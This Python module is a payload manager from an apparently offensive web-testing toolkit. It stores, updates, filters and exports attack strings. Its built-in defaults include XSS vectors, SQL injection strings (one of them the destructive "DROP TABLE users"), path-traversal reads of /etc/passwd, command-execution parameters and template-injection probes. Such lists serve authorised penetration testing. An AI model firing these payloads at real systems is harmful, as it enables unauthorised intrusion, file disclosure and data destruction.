#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ 
██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                    PAYLOAD MANAGER v1.0
           Centralized Payload Database System
           (c) 2026 GOODS-DRAGON Security Suite
"""

import json
import os
import hashlib
import requests
import time
import random
from typing import Dict, List, Any, Optional
from datetime import datetime
from core.logger import log_info, log_success, log_warning, log_error, log_debug


class PayloadManager:
    """
    Centralized Payload Management System
    - Load payloads from JSON database
    - Update payloads from remote repository
    - Version control for payloads
    - Categorize and filter payloads
    - Export payloads in various formats
    """

    VERSION = "1.0.0"
    DATABASE_URL = "https://raw.githubusercontent.com/0xL-DRAGON/GOODS-DRAGON/main/payloads/payloads.json"
    LOCAL_DB_PATH = "payloads/payloads.json"
    LOCAL_DB_DIR = "payloads"

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.payloads = {
            "xss": [],
            "sqli": [],
            "lfi": [],
            "rfi": [],
            "rce": [],
            "ssti": [],
            "ssrf": [],
            "xxe": [],
            "open_redirect": [],
            "idor": [],
            "cors": [],
            "jwt": [],
            "graphql": [],
            "nosql": [],
            "ldap": [],
            "xpath": [],
            "command": [],
            "header": [],
            "cookie": [],
            "user_agent": []
        }
        self.metadata = {
            "version": self.VERSION,
            "last_updated": None,
            "total_payloads": 0,
            "categories": list(self.payloads.keys())
        }
        self._load_local()
        self._calculate_hashes()

    def _ensure_dir(self):
        """Ensure the payloads directory exists"""
        if not os.path.exists(self.LOCAL_DB_DIR):
            os.makedirs(self.LOCAL_DB_DIR)
            log_success(f"Created directory: {self.LOCAL_DB_DIR}")

    def _calculate_hashes(self):
        """Calculate MD5 hashes for all payloads for integrity checking"""
        for category, payloads in self.payloads.items():
            for payload in payloads:
                if isinstance(payload, dict):
                    if 'id' not in payload:
                        payload['id'] = hashlib.md5(payload.get('value', '').encode()).hexdigest()[:8]
                    if 'hash' not in payload:
                        payload['hash'] = hashlib.md5(payload.get('value', '').encode()).hexdigest()

    def _get_default_payloads(self) -> Dict:
        """Return default payloads in case of missing database"""
        return {
            "xss": [
                {"value": "<script>alert(1)</script>", "type": "basic", "tags": ["alert", "script"], "severity": "high", "id": "xss_001"},
                {"value": "<img src=x onerror=alert(1)>", "type": "img", "tags": ["alert", "img", "onerror"], "severity": "high", "id": "xss_002"},
                {"value": "<svg/onload=alert(1)>", "type": "svg", "tags": ["alert", "svg", "onload"], "severity": "high", "id": "xss_003"},
                {"value": "javascript:alert(1)", "type": "url", "tags": ["alert", "url"], "severity": "medium", "id": "xss_004"},
                {"value": "'><script>alert(1)</script>", "type": "basic", "tags": ["alert", "script", "breakout"], "severity": "high", "id": "xss_005"},
                {"value": "\"><script>alert(1)</script>", "type": "basic", "tags": ["alert", "script", "breakout"], "severity": "high", "id": "xss_006"},
                {"value": "<body/onload=alert(1)>", "type": "body", "tags": ["alert", "body", "onload"], "severity": "medium", "id": "xss_007"},
                {"value": "<input/onfocus=alert(1)>", "type": "input", "tags": ["alert", "input", "onfocus"], "severity": "medium", "id": "xss_008"},
                {"value": "<iframe src=javascript:alert(1)>", "type": "iframe", "tags": ["alert", "iframe"], "severity": "medium", "id": "xss_009"},
                {"value": "<math><maction actiontype=statusline# xss=alert(1)>", "type": "math", "tags": ["alert", "math"], "severity": "low", "id": "xss_010"},
            ],
            "sqli": [
                {"value": "' OR '1'='1", "type": "basic", "tags": ["bypass", "auth"], "severity": "critical", "id": "sqli_001"},
                {"value": "' OR 1=1--", "type": "basic", "tags": ["bypass", "auth", "comment"], "severity": "critical", "id": "sqli_002"},
                {"value": "' OR 1=1#", "type": "basic", "tags": ["bypass", "auth", "comment"], "severity": "critical", "id": "sqli_003"},
                {"value": "' UNION SELECT NULL--", "type": "union", "tags": ["union", "enumeration"], "severity": "critical", "id": "sqli_004"},
                {"value": "' AND SLEEP(5)--", "type": "time", "tags": ["time", "blind"], "severity": "high", "id": "sqli_005"},
                {"value": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "type": "time", "tags": ["time", "blind"], "severity": "high", "id": "sqli_006"},
                {"value": "'; DROP TABLE users--", "type": "stacked", "tags": ["stacked", "destructive"], "severity": "critical", "id": "sqli_007"},
                {"value": "' OR '1'='1' --", "type": "basic", "tags": ["bypass", "auth", "comment"], "severity": "critical", "id": "sqli_008"},
                {"value": "' OR '1'='1' #", "type": "basic", "tags": ["bypass", "auth", "comment"], "severity": "critical", "id": "sqli_009"},
                {"value": "1' AND 1=1--", "type": "boolean", "tags": ["boolean", "blind"], "severity": "high", "id": "sqli_010"},
            ],
            "lfi": [
                {"value": "../../../etc/passwd", "type": "path", "tags": ["file_read", "unix"], "severity": "high", "id": "lfi_001"},
                {"value": "../../../../etc/passwd", "type": "path", "tags": ["file_read", "unix"], "severity": "high", "id": "lfi_002"},
                {"value": "../../../../../../etc/passwd", "type": "path", "tags": ["file_read", "unix"], "severity": "high", "id": "lfi_003"},
                {"value": "..\\..\\..\\windows\\win.ini", "type": "path", "tags": ["file_read", "windows"], "severity": "high", "id": "lfi_004"},
                {"value": "file:///etc/passwd", "type": "path", "tags": ["file_read", "unix", "protocol"], "severity": "high", "id": "lfi_005"},
            ],
            "rce": [
                {"value": "?cmd=id", "type": "cmd", "tags": ["cmd", "unix"], "severity": "critical", "id": "rce_001"},
                {"value": "?cmd=whoami", "type": "cmd", "tags": ["cmd", "unix"], "severity": "critical", "id": "rce_002"},
                {"value": "?cmd=system('id')", "type": "cmd", "tags": ["cmd", "unix", "php"], "severity": "critical", "id": "rce_003"},
                {"value": "?cmd=echo test", "type": "cmd", "tags": ["cmd", "unix"], "severity": "critical", "id": "rce_004"},
                {"value": "?cmd=ls", "type": "cmd", "tags": ["cmd", "unix", "enumeration"], "severity": "critical", "id": "rce_005"},
            ],
            "ssti": [
                {"value": "{{7*7}}", "type": "basic", "tags": ["jinja2", "template"], "severity": "critical", "id": "ssti_001"},
                {"value": "${7*7}", "type": "basic", "tags": ["velocity", "template"], "severity": "critical", "id": "ssti_002"},
                {"value": "<%= 7*7 %>", "type": "basic", "tags": ["erb", "template"], "severity": "critical", "id": "ssti_003"},
                {"value": "{{config}}", "type": "config", "tags": ["jinja2", "info_leak"], "severity": "high", "id": "ssti_004"},
                {"value": "{{''.__class__.__mro__}}", "type": "class", "tags": ["jinja2", "object"], "severity": "high", "id": "ssti_005"},
            ]
        }

    def _load_local(self):
        """Load payloads from local JSON database"""
        if os.path.exists(self.LOCAL_DB_PATH):
            try:
                with open(self.LOCAL_DB_PATH, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if 'payloads' in data:
                        self.payloads = data['payloads']
                    if 'metadata' in data:
                        self.metadata = data['metadata']
                    log_success(f"Loaded payloads from local database: {self.metadata.get('version', 'unknown')}")
                    self._calculate_hashes()
                    self._count_payloads()
                    return True
            except Exception as e:
                log_warning(f"Failed to load local database: {e}")
        
        log_warning("No local database found. Using default payloads.")
        self.payloads = self._get_default_payloads()
        self.metadata['version'] = self.VERSION
        self.metadata['last_updated'] = datetime.now().isoformat()
        self._calculate_hashes()
        self._count_payloads()
        self._save_local()
        return False

    def _save_local(self):
        """Save payloads to local JSON database"""
        self._ensure_dir()
        self._count_payloads()
        self.metadata['last_updated'] = datetime.now().isoformat()
        data = {
            "metadata": self.metadata,
            "payloads": self.payloads
        }
        try:
            with open(self.LOCAL_DB_PATH, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            log_success(f"Saved payloads to: {self.LOCAL_DB_PATH}")
            return True
        except Exception as e:
            log_error(f"Failed to save payloads: {e}")
            return False

    def _count_payloads(self):
        """Count total payloads"""
        total = 0
        for category, payloads in self.payloads.items():
            total += len(payloads)
        self.metadata['total_payloads'] = total
        return total

    def update_from_remote(self, url: Optional[str] = None) -> bool:
        """Update payloads from remote repository"""
        url = url or self.DATABASE_URL
        log_info(f"Updating payloads from: {url}")
        
        try:
            resp = requests.get(url, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if 'payloads' in data:
                    self.payloads = data['payloads']
                if 'metadata' in data:
                    self.metadata = data['metadata']
                self._calculate_hashes()
                self._save_local()
                log_success(f"Update successful! Total payloads: {self.metadata.get('total_payloads', 0)}")
                return True
            else:
                log_error(f"Update failed with status: {resp.status_code}")
                return False
        except Exception as e:
            log_error(f"Update error: {e}")
            return False

    def get_payloads(self, category: str, tags: Optional[List[str]] = None, 
                     severity: Optional[str] = None, limit: int = 100) -> List[Dict]:
        """Get payloads by category with optional filters"""
        if category not in self.payloads:
            log_warning(f"Category '{category}' not found")
            return []
        
        results = self.payloads[category]
        
        # Filter by tags
        if tags:
            results = [p for p in results if any(tag in p.get('tags', []) for tag in tags)]
        
        # Filter by severity
        if severity:
            results = [p for p in results if p.get('severity', 'medium') == severity]
        
        # Shuffle and limit
        random.shuffle(results)
        return results[:limit]

    def get_payloads_by_type(self, payload_type: str, limit: int = 50) -> List[Dict]:
        """Get payloads by type across all categories"""
        results = []
        for category, payloads in self.payloads.items():
            for payload in payloads:
                if payload.get('type') == payload_type:
                    results.append(payload)
        random.shuffle(results)
        return results[:limit]

    def get_payloads_by_tag(self, tag: str, limit: int = 50) -> List[Dict]:
        """Get payloads by tag across all categories"""
        results = []
        for category, payloads in self.payloads.items():
            for payload in payloads:
                if tag in payload.get('tags', []):
                    results.append(payload)
        random.shuffle(results)
        return results[:limit]

    def get_random_payload(self, category: str) -> Optional[Dict]:
        """Get a random payload from a category"""
        payloads = self.payloads.get(category, [])
        if payloads:
            return random.choice(payloads)
        return None

    def add_payload(self, category: str, payload: Dict) -> bool:
        """Add a new payload to a category"""
        if category not in self.payloads:
            log_warning(f"Category '{category}' not found. Creating...")
            self.payloads[category] = []
        
        # Generate ID if not provided
        if 'id' not in payload:
            payload['id'] = hashlib.md5(payload.get('value', '').encode()).hexdigest()[:8]
        
        # Generate hash
        payload['hash'] = hashlib.md5(payload.get('value', '').encode()).hexdigest()
        
        # Check for duplicates
        existing_ids = [p.get('id') for p in self.payloads[category]]
        if payload['id'] not in existing_ids:
            self.payloads[category].append(payload)
            self._save_local()
            log_success(f"Added payload to {category}: {payload.get('id')}")
            return True
        else:
            log_warning(f"Payload with ID {payload['id']} already exists")
            return False

    def remove_payload(self, category: str, payload_id: str) -> bool:
        """Remove a payload from a category"""
        if category not in self.payloads:
            return False
        
        initial_len = len(self.payloads[category])
        self.payloads[category] = [p for p in self.payloads[category] if p.get('id') != payload_id]
        
        if len(self.payloads[category]) < initial_len:
            self._save_local()
            log_success(f"Removed payload {payload_id} from {category}")
            return True
        
        log_warning(f"Payload {payload_id} not found in {category}")
        return False

    def search_payloads(self, query: str) -> List[Dict]:
        """Search for payloads across all categories"""
        results = []
        query = query.lower()
        for category, payloads in self.payloads.items():
            for payload in payloads:
                value = payload.get('value', '').lower()
                if query in value or query in payload.get('id', '').lower():
                    payload_copy = payload.copy()
                    payload_copy['category'] = category
                    results.append(payload_copy)
        return results

    def export_payloads(self, format_type: str = "json", output_file: str = None) -> Optional[str]:
        """Export payloads in various formats"""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"payloads_export_{timestamp}.{format_type}"
        
        if format_type == "json":
            data = {
                "metadata": self.metadata,
                "payloads": self.payloads
            }
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            log_success(f"Exported payloads to: {output_file}")
            return output_file
        
        elif format_type == "csv":
            import csv
            with open(output_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['category', 'id', 'type', 'value', 'severity', 'tags'])
                for category, payloads in self.payloads.items():
                    for payload in payloads:
                        writer.writerow([
                            category,
                            payload.get('id', ''),
                            payload.get('type', ''),
                            payload.get('value', ''),
                            payload.get('severity', 'medium'),
                            ','.join(payload.get('tags', []))
                        ])
            log_success(f"Exported payloads to: {output_file}")
            return output_file
        
        elif format_type == "txt":
            with open(output_file, 'w', encoding='utf-8') as f:
                for category, payloads in self.payloads.items():
                    f.write(f"\n=== {category.upper()} PAYLOADS ===\n")
                    for payload in payloads:
                        f.write(f"[{payload.get('id', '')}] {payload.get('value', '')}\n")
            log_success(f"Exported payloads to: {output_file}")
            return output_file
        
        else:
            log_error(f"Unsupported format: {format_type}")
            return None

    def get_stats(self) -> Dict:
        """Get statistics about the payload database"""
        self._count_payloads()
        stats = {
            "version": self.metadata.get('version', 'unknown'),
            "last_updated": self.metadata.get('last_updated', 'never'),
            "total_payloads": self.metadata.get('total_payloads', 0),
            "categories": len(self.payloads),
            "category_breakdown": {k: len(v) for k, v in self.payloads.items()}
        }
        return stats

    def run(self) -> Dict:
        """Main execution method"""
        log_info("=== Payload Manager ===")
        log_info(f"Version: {self.VERSION}")
        log_info(f"Total payloads: {self.metadata.get('total_payloads', 0)}")
        log_info(f"Categories: {len(self.payloads)}")
        
        stats = self.get_stats()
        
        return {
            "scan_type": "payload_manager",
            "version": self.VERSION,
            "stats": stats,
            "categories": list(self.payloads.keys())
        }


# =============================================================
# PAYLOAD CATEGORIES AND TYPES (for reference)
# =============================================================
PAYLOAD_CATEGORIES = {
    "xss": "Cross-Site Scripting payloads",
    "sqli": "SQL Injection payloads",
    "lfi": "Local File Inclusion payloads",
    "rfi": "Remote File Inclusion payloads",
    "rce": "Remote Code Execution payloads",
    "ssti": "Server-Side Template Injection payloads",
    "ssrf": "Server-Side Request Forgery payloads",
    "xxe": "XML External Entity payloads",
    "open_redirect": "Open Redirect payloads",
    "idor": "Insecure Direct Object Reference payloads",
    "cors": "CORS misconfiguration payloads",
    "jwt": "JWT token attack payloads",
    "graphql": "GraphQL injection payloads",
    "nosql": "NoSQL injection payloads",
    "ldap": "LDAP injection payloads",
    "xpath": "XPath injection payloads",
    "command": "Command injection payloads",
    "header": "HTTP header injection payloads",
    "cookie": "Cookie manipulation payloads",
    "user_agent": "User-Agent injection payloads"
}

PAYLOAD_TYPES = {
    "basic": "Basic injection",
    "union": "Union-based injection",
    "time": "Time-based blind injection",
    "boolean": "Boolean-based blind injection",
    "stacked": "Stacked queries",
    "error": "Error-based injection",
    "path": "Path traversal",
    "cmd": "Command injection",
    "config": "Configuration disclosure",
    "class": "Object class manipulation",
    "img": "Image tag injection",
    "svg": "SVG tag injection",
    "url": "URL-based injection",
    "script": "Script tag injection",
    "body": "Body tag injection",
    "input": "Input tag injection",
    "iframe": "Iframe tag injection",
    "math": "MathML tag injection"
}

PAYLOAD_SEVERITIES = {
    "critical": "Immediate action required",
    "high": "High priority fix",
    "medium": "Medium priority fix",
    "low": "Low priority fix"
}
